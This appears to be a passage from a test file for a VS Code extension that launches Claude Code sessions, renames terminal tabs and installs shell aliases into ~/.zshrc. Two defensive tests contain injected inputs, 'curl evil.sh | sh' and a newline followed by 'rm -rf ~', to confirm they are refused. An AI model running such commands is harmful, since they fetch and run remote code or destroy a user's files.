// shell that may not be listening yet. Both paths have to end with `claude` run
// exactly once — a line that arrives through both is a second session.
test('the command goes through shell integration when it arrives', async () => {
    const run = activate({ segments: ['{today}'] });
    try {
        await openClaude();
        const terminal = lastTerminal();
        vscode.__shellIntegrationArrives(terminal);
        assert.deepEqual(terminal.executed, ['claude']);
        assert.deepEqual(terminal.sent, [], 'typing it as well would run a second session');
    } finally { run.dispose(); }
});

// The session can be started on a model and an effort of its own. The command is
// built as text for a shell, so the one thing that has to be right is quoting:
// `opus[1m]` unquoted is a glob, and zsh answers `no matches found` instead of
// running anything.
const ranIn = (terminal) => {
    vscode.__shellIntegrationArrives(terminal);
    return terminal.executed[0];
};

test('the model and the effort from the settings are passed to the session', async () => {
    const run = activate({ segments: ['{today}'], settings: { model: 'opus[1m]', effort: 'max' } });
    try {
        await openClaude();
        assert.equal(ranIn(lastTerminal()), "claude --model 'opus[1m]' --effort 'max'");
    } finally { run.dispose(); }
});

// `--advisor` is a real flag the client hides from its own `--help`
// (`.hideHelp()` on the option), which is exactly why it is worth a setting:
// nobody finds it by reading the usage text.
test('the advisor is passed too, after the model and the effort', async () => {
    const run = activate({
        segments: ['{today}'],
        settings: { model: 'opus[1m]', effort: 'max', advisor: 'fable' },
    });
    try {
        await openClaude();
        assert.equal(ranIn(lastTerminal()), "claude --model 'opus[1m]' --effort 'max' --advisor 'fable'");
    } finally { run.dispose(); }
});

// There is no `--output-style` flag — the client has none — but `outputStyle` is
// an ordinary setting, and `--settings` takes JSON that merges with the settings
// files rather than replacing them. So the style is asked for that way.
test('the output style is passed as settings json, which merges rather than replaces', async () => {
    const run = activate({ segments: ['{today}'], settings: { model: 'opus', outputStyle: 'Explanatory' } });
    try {
        await openClaude();
        assert.equal(ranIn(lastTerminal()), `claude --model 'opus' --settings '{"outputStyle":"Explanatory"}'`);
    } finally { run.dispose(); }
});

test('a setting left empty adds no flag at all', async () => {
    const run = activate({ segments: ['{today}'], settings: { model: '', effort: 'high' } });
    try {
        await openClaude();
        assert.equal(ranIn(lastTerminal()), "claude --effort 'high'");
    } finally { run.dispose(); }
});

test('extra launch arguments follow the flags, as written', async () => {
    const run = activate({
        segments: ['{today}'],
        settings: { model: 'sonnet', launchArgs: '--permission-mode acceptEdits' },
    });
    try {
        await openClaude();
        assert.equal(ranIn(lastTerminal()), "claude --model 'sonnet' --permission-mode acceptEdits");
    } finally { run.dispose(); }
});

// The one-off command asks instead of reading the settings, so a run that is not
// like the others costs a pick rather than a trip to the settings and back.
test('the "with…" command starts the session on what was picked, not on the settings', async () => {
    const run = activate({ segments: ['{today}'], settings: { model: 'haiku', effort: 'low' } });
    try {
        vscode.__answerQuickPicks({ label: 'fable' }, { label: 'xhigh' });
        await vscode.__commands.get('claudeStatusline.openClaudeWith')();
        assert.equal(ranIn(lastTerminal()), "claude --model 'fable' --effort 'xhigh'");
        assert.equal(vscode.__quickPicks.length, 2, 'one pick for the model and one for the effort');
    } finally { run.dispose(); }
});

test('dismissing the model pick leaves the session unstarted', async () => {
    const run = activate({ segments: ['{today}'] });
    try {
        await vscode.__commands.get('claudeStatusline.openClaudeWith')();
        assert.deepEqual(vscode.__terminals, [], 'a dialog closed with escape is not a request to open anything');
    } finally { run.dispose(); }
});

// A button that starts a session on a model chosen weeks ago should say so
// before it is pressed, in the same hover that already names where it will land.
test('the button says which model and effort it would start on', () => {
    const run = activate({ segments: ['{today}'], settings: { model: 'opus[1m]', effort: 'max' } });
    try {
        const btn = vscode.__items.find((i) => i.id === 'claudeStatusline.open');
        assert.match(String(btn.tooltip), /opus\[1m\].*max|max.*opus\[1m\]/s);
    } finally { run.dispose(); }
});

test('a shell with no integration is typed into instead, and only once', async () => {
    const run = activate({ segments: ['{today}'] });
    try {
        await openClaude();
        const terminal = lastTerminal();
        await new Promise((r) => setTimeout(r, 3100));
        assert.deepEqual(terminal.sent, ['claude']);
        // Integration turning up late must not run it a second time.
        vscode.__shellIntegrationArrives(terminal);
        assert.deepEqual(terminal.executed, []);
        assert.deepEqual(terminal.sent, ['claude']);
    } finally { run.dispose(); }
});

// A session that ends leaves a shell prompt sitting in a tab labelled Claude
// Code. A session that failed is the opposite case: its terminal holds the only
// explanation there is, and closing the tab would take it away.
test('the tab closes when the session ends cleanly and stays when it fails', async () => {
    const run = activate({ segments: ['{today}'] });
    try {
        await openClaude();
        const ok = lastTerminal();
        vscode.__shellExecutionEnds(ok, 'claude', 0);
        assert.equal(ok.disposed, true);

        await openClaude();
        const failed = lastTerminal();
        vscode.__shellExecutionEnds(failed, 'claude', 127);
        assert.equal(failed.disposed, false, 'command not found is the answer to why nothing happened');
    } finally { run.dispose(); }
});

// The tab wears this extension's own icon, and only ever that. An earlier
// version read Claude Code's logo out of the installed extension — nothing was
// copied, but it put Anthropic's mark in this interface, which their trademark
// guidelines do not allow without approval. Pinned here so it cannot drift back:
// two files of ours, both present, and no path into anybody else's extension.
test('the tab wears this extension’s icon, one file per theme', async () => {
    const run = activate({ segments: ['{today}'] });
    try {
        await openClaude();
        const icon = lastTerminal().options.iconPath;
        assert.match(icon.light.fsPath, /media\/open-claude-light\.svg$/);
        assert.match(icon.dark.fsPath, /media\/open-claude-dark\.svg$/);
        for (const uri of [icon.light, icon.dark]) {
            assert.ok(fs.existsSync(uri.fsPath), `${uri.fsPath} does not exist`);
        }
    } finally { run.dispose(); }
});

test('the icon does not change when Claude Code’s extension is installed', async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ccsl-claude-'));
    fs.mkdirSync(path.join(dir, 'resources'));
    fs.writeFileSync(path.join(dir, 'resources', 'claude-logo.svg'), '<svg/>');
    test.after(() => fs.rmSync(dir, { recursive: true, force: true }));
    const run = activate({ segments: ['{today}'] });
    try {
        vscode.__installExtension('Anthropic.claude-code', dir);
        await openClaude();
        assert.match(lastTerminal().options.iconPath.dark.fsPath, /media\/open-claude-dark\.svg$/,
            'their logo sitting on disk is not a reason to put their mark in this UI');
    } finally { run.dispose(); }
});

// An icon that does not resolve costs nothing at build time and nothing at load
// time: the button simply draws blank, and only looking at it says so. Two ways
// to get there, and the second one happened — `media/**` is excluded from the
// package, so a file that is right here in the repository shipped as nothing.
test('every icon the manifest names exists and ships with the package', () => {
    const root = path.join(__dirname, '..');
    const manifest = JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8'));
    const paths = manifest.contributes.commands
        .map((c) => c.icon)
        .filter((icon) => icon && typeof icon === 'object')
        .flatMap((icon) => Object.values(icon));
    assert.ok(paths.length > 0, 'this checks the file-based icons; a codicon string has nothing to resolve');

    const rules = fs.readFileSync(path.join(root, '.vscodeignore'), 'utf8')
        .split('\n').map((l) => l.trim()).filter((l) => l && !l.startsWith('#'));
    for (const rel of paths) {
        assert.ok(fs.existsSync(path.join(root, rel)), `${rel} is named in package.json but not on disk`);
        const excluded = rules.some((r) => r.endsWith('/**') && rel.startsWith(r.slice(0, -2)));
        assert.ok(!excluded || rules.includes(`!${rel}`),
            `${rel} is excluded from the .vsix by .vscodeignore — add !${rel}`);
    }
});

// The tab is named after the session running in it. Two things make this worth
// pinning: the rename can only reach the active terminal, so the wiring has to
// pick the right tab out of whatever is active; and the title is re-read every
// ten seconds, so a rename that does not compare against the last one it set
// would fire a command six times a minute forever.
const renames = () => vscode.__executed
    .filter((c) => c.id === 'workbench.action.terminal.renameWithArg')
    .map((c) => c.args[0].name);

// The two session reads this depends on, both of which touch the machine: which
// session runs under a shell, and what its transcript last called it.
function withSession(session, title, run) {
    const real = { sessionForShell: s.sessionForShell, titleOf: s.titleOf };
    s.sessionForShell = (pid) => (session && pid === session.shellPid ? session : null);
    s.titleOf = () => title;
    try { return run(); } finally { Object.assign(s, real); }
}

const openActiveTab = async (pid = 4242) => {
    vscode.__nextTerminalPid(pid);
    await openClaude();
    // The pid arrives through a promise the caller subscribes to as the terminal
    // is created; let it land before anything reads it.
    await new Promise((r) => setImmediate(r));
    return lastTerminal();
};

test('the tab takes the name of the session running in it', async () => {
    const run = activate({ segments: ['{today}'] });
    try {
        const terminal = await openActiveTab();
        await withSession({ shellPid: 4242, sessionId: 'abc', cwd: '/w' }, 'Fix the terminal tab', async () => {
            vscode.__activateTerminal(terminal);
            await new Promise((r) => setImmediate(r));
        });
        assert.deepEqual(renames(), ['Fix the terminal tab']);
    } finally { run.dispose(); }
});

test('a title that has not changed is not set again', async () => {
    const run = activate({ segments: ['{today}'] });
    try {
        const terminal = await openActiveTab();
        await withSession({ shellPid: 4242, sessionId: 'abc', cwd: '/w' }, 'Same title', async () => {
            for (let i = 0; i < 3; i++) {
                vscode.__activateTerminal(terminal);
                await new Promise((r) => setImmediate(r));
            }
        });
        assert.deepEqual(renames(), ['Same title'], 'the tick asks every ten seconds; only a change is worth a command');
    } finally { run.dispose(); }
});

test('a terminal this extension did not open is left alone', async () => {
    const run = activate({ segments: ['{today}'] });
    try {
        await openActiveTab();
        await withSession({ shellPid: 4242, sessionId: 'abc', cwd: '/w' }, 'Someone else', async () => {
            vscode.__activateTerminal({ name: 'not ours' });
            await new Promise((r) => setImmediate(r));
        });
        assert.deepEqual(renames(), []);
    } finally { run.dispose(); }
});

// A reload restarts the extension host while the shells keep running, so the
// tabs come back with nothing tying them to the sessions inside them — and with
// almost nothing of how they were made: the extension host rebuilds
// `creationOptions` from six fields, and the icon is not one of them. What is
// left is the mark in the environment and this extension's own note of the pid.
const OUR_ICON = { light: { fsPath: '/anywhere/media/open-claude-light.svg' }, dark: { fsPath: '/anywhere/media/open-claude-dark.svg' } };
const OUR_ENV = { CLAUDE_DASHBOARD_TAB: '1' };

// The pid a restored tab reports arrives through a promise, exactly as an opened
// one's does, and taking it over waits for that — so the wait happens outside
// `withSession`, whose stand-in for the session reader lasts only as long as the
// synchronous half of what it is given.
const restoreTab = async (options) => {
    const terminal = vscode.__restoreTerminal(options);
    await new Promise((r) => setImmediate(r));
    return terminal;
};

test('a tab restored after a reload is taken back over, by the mark in its environment', async () => {
    const run = activate({ segments: ['{today}'] });
    try {
        const restored = await restoreTab({ name: 'renamed by a session', env: OUR_ENV, pid: 707 });
        await withSession({ shellPid: 707, sessionId: 'abc', cwd: '/w' }, 'Restored session', async () => {
            vscode.__activateTerminal(restored);
            await new Promise((r) => setImmediate(r));
        });
        assert.deepEqual(renames(), ['Restored session']);
    } finally { run.dispose(); }
});

test('a tab whose mark did not survive is taken back over by its pid', async () => {
    const run = activate({ segments: ['{today}'] });
    try {
        // What the previous window left behind: the button opened a tab, and the
        // pid of its shell went into the register.
        const opened = await openActiveTab(808);
        opened.dispose();
        const restored = await restoreTab({ name: 'renamed by a session', pid: 808 });
        await withSession({ shellPid: 808, sessionId: 'abc', cwd: '/w' }, 'By its pid', async () => {
            vscode.__activateTerminal(restored);
            await new Promise((r) => setImmediate(r));
        });
        assert.deepEqual(renames(), ['By its pid']);
    } finally { run.dispose(); }
});

test("a restored terminal of somebody else's is not taken over", async () => {
    const run = activate({ segments: ['{today}'] });
    try {
        const restored = await restoreTab({ name: 'zsh', iconPath: { fsPath: '/elsewhere/terminal.svg' }, pid: 909 });
        await withSession({ shellPid: 909, sessionId: 'abc', cwd: '/w' }, 'Not ours to name', async () => {
            vscode.__activateTerminal(restored);
            await new Promise((r) => setImmediate(r));
        });
        assert.deepEqual(renames(), [], 'a session running in a tab this extension did not open is still their tab');
    } finally { run.dispose(); }
});

// Claude Code's own button opens its terminals under exactly this name, so a
// name match would rename and close a tab belonging to another extension.
test("a restored tab named like ours but opened by somebody else is left alone", async () => {
    const run = activate({ segments: ['{today}'] });
    try {
        const restored = await restoreTab({ name: 'Claude Code', iconPath: OUR_ICON, pid: 606 });
        await withSession({ shellPid: 606, sessionId: 'abc', cwd: '/w' }, 'Their tab', async () => {
            vscode.__activateTerminal(restored);
            await new Promise((r) => setImmediate(r));
        });
        assert.deepEqual(renames(), [], 'the name and the icon are not evidence: neither survives a reload of ours');
    } finally { run.dispose(); }
});

test('renameTabs off leaves the tab as it was opened', async () => {
    const run = activate({ segments: ['{today}'], settings: { renameTabs: false } });
    try {
        const terminal = await openActiveTab();
        await withSession({ shellPid: 4242, sessionId: 'abc', cwd: '/w' }, 'Would have been this', async () => {
            vscode.__activateTerminal(terminal);
            await new Promise((r) => setImmediate(r));
        });
        assert.deepEqual(renames(), []);
    } finally { run.dispose(); }
});

test('a shell with no session under it is not renamed to nothing', async () => {
    const run = activate({ segments: ['{today}'] });
    try {
        const terminal = await openActiveTab();
        await withSession(null, '', async () => {
            vscode.__activateTerminal(terminal);
            await new Promise((r) => setImmediate(r));
        });
        assert.deepEqual(renames(), []);
    } finally { run.dispose(); }
});

// An empty pane still claims its share of the sidebar's height, and that share
// comes out of the limits above it — so the session pane is hidden rather than
// emptied when no Claude session is open in this window. The context key is what
// the manifest's `when` reads.
test('the session pane is switched off when this window has no session', () => {
    const run = activate({ segments: ['{today}'] });
    try {
        const keys = () => vscode.__executed
            .filter((e) => e.id === 'setContext' && e.args[0] === 'claudeStatusline.hasSession')
            .map((e) => e.args[1]);
        // A state with no session of its own: the collectors found no transcript
        // for this window, so `statusNow` has neither a context nor a money row.
        assert.deepEqual(keys().slice(-1), [false]);
    } finally {
        run.dispose();
    }
});

// The badge is the only number this extension puts where it can be read without
// opening anything, so what it counts matters: sessions that are actually alive,
// and nothing at all when there are none — a badge reading nought is a dot that
// never leaves.
test('the badge counts live sessions and disappears when there are none', () => {
    const sessions = [
        { id: 'a', pid: 1, alive: true, status: 'running', cwd: 'repo-one', entrypoint: 'cli' },
        { id: 'b', pid: 2, alive: false, status: '', cwd: 'repo-two', entrypoint: 'cli' },
    ];
    const tree = new ext.__LiveSessionsTree(() => sessions);
    tree.view = {};

    tree.refresh();
    assert.equal(tree.view.badge.value, 1);
    assert.match(tree.view.badge.tooltip, /1 live Claude session$/);

    sessions[0].alive = false;
    tree.refresh();
    assert.equal(tree.view.badge, undefined);
});

test('a live session is a row named by its project, with its client beside it', () => {
    const tree = new ext.__LiveSessionsTree(() => [
        { id: 'sesn-1', pid: 42, alive: true, status: 'running', cwd: 'claude-statusline', entrypoint: 'claude-vscode' },
    ]);
    const [row] = tree.getChildren();
    const item = tree.getTreeItem(row);
    assert.equal(item.label, 'claude-statusline');
    assert.match(item.description, /claude-vscode/);
    assert.match(item.description, /running/);
});

test('another terminal ending does not take this tab with it', async () => {
    const run = activate({ segments: ['{today}'] });
    try {
        await openClaude();
        const terminal = lastTerminal();
        vscode.__shellExecutionEnds({ name: 'someone else' }, 'claude', 0);
        assert.equal(terminal.disposed, false);
        // Nor does a different command finishing inside this one.
        vscode.__shellExecutionEnds(terminal, 'git status', 0);
        assert.equal(terminal.disposed, false);
    } finally { run.dispose(); }
});

// Which session the bar is about, when the window holds several terminals.
//
// `findOwnSession` matches a session whose parent is the extension host, which
// is the Claude Code panel — a terminal session's parent is its shell, so those
// fall through to "same workspace, newest transcript". With two tabs open that
// answer flips between them as they write, and the bar silently describes
// whichever one typed last. The active tab is the honest answer.
async function withOwnership({ own, byShell = {} }, run) {
    const real = {
        findOwnSession: s.findOwnSession,
        sessionForShell: s.sessionForShell,
        transcriptPath: s.transcriptPath,
    };
    const seen = [];
    s.findOwnSession = () => own;
    s.sessionForShell = (pid) => byShell[pid] || null;
    s.transcriptPath = (w, id) => { seen.push(id); return `/nowhere/${id}.jsonl`; };
    // Awaited, not returned: a `finally` around a returned promise restores the
    // real functions before the first await inside has even run.
    try { return await run(seen); } finally { Object.assign(s, real); }
}

const PANEL = { pid: 11, sessionId: 'panel-session', cwd: '/w' };
const TAB_A = { pid: 21, sessionId: 'tab-a-session', cwd: '/w' };
const TAB_B = { pid: 22, sessionId: 'tab-b-session', cwd: '/w' };

test('the bar follows the session in the active terminal, not the newest one', async () => {
    const run = activate({ segments: ['{ctx}'], workspace: '/w' });
    try {
        await withOwnership({ own: PANEL, byShell: { 4242: TAB_A } }, async (seen) => {
            const terminal = await openActiveTab(4242);
            vscode.__activateTerminal(terminal);
            await new Promise((r) => setImmediate(r));
            await vscode.__commands.get('claudeStatusline.refresh')();
            assert.ok(seen.includes('tab-a-session'),
                `the active tab's session never reached the reads: ${JSON.stringify(seen)}`);
        });
    } finally { run.dispose(); }
});

test('switching terminal tabs switches which session the bar describes', async () => {
    const run = activate({ segments: ['{ctx}'], workspace: '/w' });
    try {
        await withOwnership({ own: PANEL, byShell: { 4242: TAB_A, 4343: TAB_B } }, async (seen) => {
            const a = await openActiveTab(4242);
            vscode.__activateTerminal(a);
            await new Promise((r) => setImmediate(r));
            await vscode.__commands.get('claudeStatusline.refresh')();

            const b = await openActiveTab(4343);
            vscode.__activateTerminal(b);
            await new Promise((r) => setImmediate(r));
            seen.length = 0;
            await vscode.__commands.get('claudeStatusline.refresh')();
            assert.ok(seen.includes('tab-b-session'),
                `the bar stayed on the old tab: ${JSON.stringify(seen)}`);
            assert.ok(!seen.includes('tab-a-session'), 'the old tab is still being read');
        });
    } finally { run.dispose(); }
});

// A terminal with no Claude in it is the common case — `git log`, a dev server,
// a shell. The bar keeps saying what it said rather than emptying out, because
// an empty bar reads as broken rather than as "this tab has no session".
test('a terminal with no session in it leaves the bar as it was', async () => {
    const run = activate({ segments: ['{ctx}'], workspace: '/w' });
    try {
        await withOwnership({ own: PANEL, byShell: {} }, async (seen) => {
            const plain = await openActiveTab(9999);
            vscode.__activateTerminal(plain);
            await new Promise((r) => setImmediate(r));
            await vscode.__commands.get('claudeStatusline.refresh')();
            assert.ok(seen.includes('panel-session'),
                `the fallback stopped working: ${JSON.stringify(seen)}`);
        });
    } finally { run.dispose(); }
});

// A window that opens with a terminal already active — a reload restores both
// the terminals and which of them was last used — fires no change event, so the
// shell pid has to be asked for once at startup or the bar sits on the workspace
// guess until a tab is clicked.
test('a terminal already active when the window opens is picked up', async () => {
    const first = activate({ segments: ['{ctx}'], workspace: '/w' });
    const terminal = await openActiveTab(4242);
    vscode.__activateTerminal(terminal);
    await new Promise((r) => setImmediate(r));
    for (const d of first.context.subscriptions) d.dispose();

    // A second activate over the same window state: the terminal is still there
    // and still active, and nothing will announce it.
    const context = { ...first.context, subscriptions: [] };
    await withOwnership({ own: PANEL, byShell: { 4242: TAB_A } }, async (seen) => {
        ext.activate(context);
        await new Promise((r) => setImmediate(r));
        seen.length = 0;
        await vscode.__commands.get('claudeStatusline.refresh')();
        assert.ok(seen.includes('tab-a-session'),
            `startup ignored the already-active terminal: ${JSON.stringify(seen)}`);
    });
    for (const d of context.subscriptions) d.dispose();
    first.dispose();
});

// Switching tabs has to redraw, not merely remember. The change event updated
// the shell pid and renamed the tab, but nothing drew — so the bar kept showing
// the previous tab's context and spend until the next ten-second tick, which is
// the silently-wrong-session this whole feature exists to remove.
//
// The refresh command is deliberately not called here: that is what hid it.
test('switching tabs redraws at once, without waiting for a tick', async () => {
    const run = activate({ segments: ['{ctx}'], workspace: '/w' });
    try {
        await withOwnership({ own: PANEL, byShell: { 4242: TAB_A } }, async (seen) => {
            const terminal = await openActiveTab(4242);
            seen.length = 0;
            vscode.__activateTerminal(terminal);
            await new Promise((r) => setImmediate(r));
            await new Promise((r) => setImmediate(r));
            assert.ok(seen.includes('tab-a-session'),
                `nothing was drawn on the switch: ${JSON.stringify(seen)}`);
        });
    } finally { run.dispose(); }
});

// The command line on the Launch tab follows the choices as they are picked,
// before anything is saved — so it cannot be built from the stored settings. It
// is asked for over the same channel the segment previews use, and answered by
// the very function that opens the terminal: one implementation, so a quoting
// rule cannot hold for the line that runs and not for the line that is shown.
test('the launch tab is answered with the command that would actually run', async () => {
    const run = activate({ segments: ['{today}'] });
    let panel;
    try {
        panel = await openDashboard();
        const choices = {
            model: 'opus[1m]', effort: 'max', advisor: 'fable',
            outputStyle: 'Explanatory', launchArgs: '--permission-mode acceptEdits',
        };
        await panel.__receive({ type: 'launchPreview', settings: choices });
        const reply = lastPost(panel);
        assert.equal(reply.type, 'launchPreview');
        assert.equal(reply.command, db.claudeCommand({
            model: choices.model, effort: choices.effort, advisor: choices.advisor,
            outputStyle: choices.outputStyle, args: choices.launchArgs,
        }));
        assert.match(reply.command, /^claude --model 'opus\[1m\]'/);
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// Copying goes through the editor rather than the page: a webview's own
// clipboard write is not guaranteed, and this is the one thing the panel exists
// to hand over.
test('the command can be copied to the clipboard', async () => {
    const run = activate({ segments: ['{today}'] });
    let panel;
    try {
        panel = await openDashboard();
        await panel.__receive({ type: 'copy', text: "claude --model 'opus'" });
        assert.deepEqual(vscode.__copied, ["claude --model 'opus'"]);
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// The alias is built where the command is, and answered over the same channel:
// it is the command quoted once more, so a second implementation of that
// quoting is a second chance to ship a line that will not source.
test('the launch preview answers with the alias as well as the command', async () => {
    const run = activate({ segments: ['{today}'] });
    let panel;
    try {
        panel = await openDashboard();
        const choices = { model: 'opus[1m]', effort: 'max', aliasName: 'claude-vs' };
        await panel.__receive({ type: 'launchPreview', settings: choices });
        const reply = lastPost(panel);
        assert.equal(reply.alias, db.aliasLine('claude-vs', {
            model: 'opus[1m]', effort: 'max', advisor: undefined,
            outputStyle: undefined, args: undefined,
        }));
        assert.match(reply.alias, /^alias claude-vs='claude --model /);
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// It is written into the user's own shell file by hand, so it is theirs to
// scope: a repository that shipped a `.vscode/settings.json` naming an alias
// would be writing a line into somebody else's terminal.
test('the alias name is a machine setting, like the extra arguments', () => {
    const manifest = JSON.parse(fs.readFileSync(`${__dirname}/../package.json`, 'utf8'));
    const prop = manifest.contributes.configuration.properties['claudeStatusline.aliasName'];
    assert.ok(prop, 'the setting does not exist');
    assert.equal(prop.scope, 'machine');
    assert.equal(prop.default, '');
});

// A key the page can draw but not save is a choice that looks forgotten the
// moment you press Save; a key saved but not read back is one that vanishes on
// the next redraw. And this one is `machine` in the manifest, so a workspace
// write would be rejected with an error that takes the rest of the save with it.
test('the alias name is written, read back, and never written to a workspace', async () => {
    const run = activate({ segments: ['{today}'] });
    let panel;
    try {
        panel = await openDashboard();
        await panel.__receive({
            type: 'save', scope: 'workspace',
            settings: { aliasName: 'claude-vs' },
        });
        const wrote = vscode.__updates.filter((u) => u.key === 'aliasName');
        assert.equal(wrote.length, 1, 'the name never reached the settings');
        assert.equal(wrote[0].target, vscode.ConfigurationTarget.Global,
            'a machine-scoped key must not be written to the workspace');

        const html = panel.webview.html;
        assert.match(html, /id="aliasName"/, 'the page cannot draw it back');
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// Writing into the user's own shell file. Everything about this is about not
// losing what was there: a backup before the first write, an atomic replace so
// a crash cannot truncate it, and the file's own content untouched outside the
// markers. It happens on a button, never on a save — a settings page that
// quietly edited ~/.zshrc would be a surprise nobody asked for.
async function withHome(run) {
    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'ccsl-home-'));
    const rc = path.join(home, '.zshrc');
    // Awaited, not returned: a `finally` around a returned promise takes the
    // directory away before the first await inside has run.
    try { return await run({ home, rc }); } finally { fs.rmSync(home, { recursive: true, force: true }); }
}

test('installing the alias keeps the file it found and backs it up first', async () => {
    const run = activate({ segments: ['{today}'] });
    let panel;
    try {
        panel = await openDashboard();
        await withHome(async ({ home, rc }) => {
            const before = "# mine\nalias cx='claude --effort max'\n";
            fs.writeFileSync(rc, before);
            ext.installAlias({
                settings: { aliasName: 'cvs', model: 'opus' },
                home, shell: '/bin/zsh',
            });
            const after = fs.readFileSync(rc, 'utf8');
            assert.match(after, /alias cx='claude --effort max'/, 'their own alias is gone');
            assert.match(after, /alias cvs='claude --model 'oe/.source ? /alias cvs='claude --model / : /x/,
                'ours never arrived');
            assert.equal(fs.readFileSync(`${rc}.claude-dashboard.bak`, 'utf8'), before,
                'the file was changed with no copy of what it was');
        });
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

test('installing twice does not stack blocks and rewrites the one that is there', async () => {
    const run = activate({ segments: ['{today}'] });
    let panel;
    try {
        panel = await openDashboard();
        await withHome(async ({ home, rc }) => {
            fs.writeFileSync(rc, '# mine\n');
            const send = (settings) => ext.installAlias({ settings, home, shell: '/bin/zsh' });
            send({ aliasName: 'a' });
            send({ aliasName: 'b', effort: 'max' });
            const after = fs.readFileSync(rc, 'utf8');
            assert.equal((after.match(/>>> claude-dashboard >>>/g) || []).length, 1);
            assert.match(after, /alias b='claude --effort /);
            assert.ok(!after.includes('alias a='), 'the old alias is still there');
        });
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// A shell whose alias does not take this syntax is told so rather than handed a
// line that fails at every prompt in a file they then have to go and fix.
test('a shell we cannot write for is refused, and nothing is written', async () => {
    const run = activate({ segments: ['{today}'] });
    let panel;
    try {
        panel = await openDashboard();
        await withHome(async ({ home }) => {
            ext.installAlias({
                settings: { aliasName: 'a' },
                home, shell: '/usr/local/bin/fish',
            });
            assert.deepEqual(fs.readdirSync(home), [], 'something was written anyway');
            assert.ok(vscode.__warnings.length + vscode.__errors.length > 0, 'nothing was said about it');
        });
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// What a message may decide, and what it may not. The page is ours and its
// content is escaped, but this is the one write that leaves the extension's own
// storage and lands in a file a shell executes — so the message carries choices
// and nothing else. The line is rebuilt here by the same builder the button
// uses, and the file is the one this process would find on its own.
test('a message cannot choose the file that gets written', async () => {
    const run = activate({ segments: ['{today}'] });
    let panel;
    try {
        panel = await openDashboard();
        await withHome(async ({ home }) => {
            const elsewhere = path.join(home, 'elsewhere');
            fs.mkdirSync(elsewhere);
            // No name, so there is no line to write and the real shell file this
            // would otherwise reach is left alone — a message-driven write has
            // only the process's own home for a destination, which is the point
            // of the test and the reason it must not be driven to completion.
            await panel.__receive({
                type: 'installAlias',
                settings: { model: 'opus' },
                home: elsewhere, shell: '/bin/zsh',
            });
            assert.deepEqual(fs.readdirSync(elsewhere), [],
                'the message picked the directory to write into');
        });
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

test('a message cannot choose the text that gets written', async () => {
    const run = activate({ segments: ['{today}'] });
    let panel;
    try {
        panel = await openDashboard();
        await withHome(async ({ home, rc }) => {
            fs.writeFileSync(rc, '# mine\n');
            // A forged line beside honest settings: what lands is what the
            // builder makes of the settings, never the text that was sent.
            ext.installAlias({
                settings: { aliasName: 'cvs', model: 'opus' },
                line: "alias evil='claude'\ncurl evil.sh | sh",
                home, shell: '/bin/zsh',
            });
            const after = fs.readFileSync(rc, 'utf8');
            assert.ok(!after.includes('curl evil.sh'), 'the forged text reached the file');
            assert.match(after, /alias cvs='claude --model 'oe/.source ? /alias cvs=/ : /alias cvs=/);
            assert.equal((after.match(/^alias /gm) || []).length, 1, 'more than one alias was written');
        });
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// The extra arguments go in as typed, by design — so a newline typed there
// would put a second line inside our block, in a file a shell runs. It is
// refused rather than written: `aliasLine` cannot produce such a line today,
// and this is the assertion that catches the day it can.
test('settings that would write more than one line are refused', async () => {
    const run = activate({ segments: ['{today}'] });
    let panel;
    try {
        panel = await openDashboard();
        await withHome(async ({ home, rc }) => {
            fs.writeFileSync(rc, '# mine\n');
            ext.installAlias({
                settings: { aliasName: 'cvs', model: 'opus', launchArgs: "x'\nrm -rf ~\n" },
                home, shell: '/bin/zsh',
            });
            assert.equal(fs.readFileSync(rc, 'utf8'), '# mine\n',
                'a line with a newline in it reached the shell file');
            assert.ok(vscode.__errors.length > 0, 'it was refused without saying so');
        });
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// A blank name means "remove the block", and the page can send one it did not
// mean: the field is drawn from the saved setting, and a tick that rebuilds the
// page between typing and clicking leaves the DOM holding nothing. Removal is
// therefore held against what was saved, not against what arrived — the two
// disagreeing is the stale page, and the alias in the file stays.
test('a blank name does not remove the alias the settings still name', async () => {
    const run = activate({ segments: ['{today}'], settings: { aliasName: 'cx' } });
    let panel;
    try {
        panel = await openDashboard();
        await withHome(async ({ home, rc }) => {
            fs.writeFileSync(rc, '# mine\n');
            ext.installAlias({ settings: { aliasName: 'cx', model: 'opus' }, home, shell: '/bin/zsh' });
            const written = fs.readFileSync(rc, 'utf8');
            assert.match(written, /alias cx=/, 'nothing was written to remove');

            vscode.__errors.length = 0;
            vscode.__warnings.length = 0;
            ext.installAlias({ settings: { aliasName: '', model: 'opus' }, home, shell: '/bin/zsh' });
            assert.equal(fs.readFileSync(rc, 'utf8'), written, 'the alias was removed by a blank field');
            assert.ok(vscode.__warnings.length > 0, 'it was refused without saying so');
        });
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// A blank field cannot delete anything, whatever the setting says. Holding the
// blank against the saved name was not enough: Save writes the same blank field
// into the setting, so one click made the two agree and the next one removed the
// block. A state that cannot be told apart from "the field never got its value"
// is not an instruction, so removal is not reachable from it at all.
test('a blank name removes nothing even when the setting is blank as well', async () => {
    const run = activate({ segments: ['{today}'], settings: { aliasName: '' } });
    let panel;
    try {
        panel = await openDashboard();
        await withHome(async ({ home, rc }) => {
            fs.writeFileSync(rc, '# mine\n');
            ext.installAlias({ settings: { aliasName: 'cx', model: 'opus' }, home, shell: '/bin/zsh' });
            const written = fs.readFileSync(rc, 'utf8');
            assert.match(written, /alias cx=/);

            vscode.__warnings.length = 0;
            ext.installAlias({ settings: { aliasName: '', model: 'opus' }, home, shell: '/bin/zsh' });
            assert.equal(fs.readFileSync(rc, 'utf8'), written, 'a blank field removed the block');
            assert.ok(vscode.__warnings.some((w) => /Remove the shell alias/.test(w)),
                'the warning does not name the command that removes it');
        });
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// Removal is its own act, named as one. It is the only path that takes the block
// out, and it says so when there was nothing to take out.
test('the remove command takes the block out and nothing else', async () => {
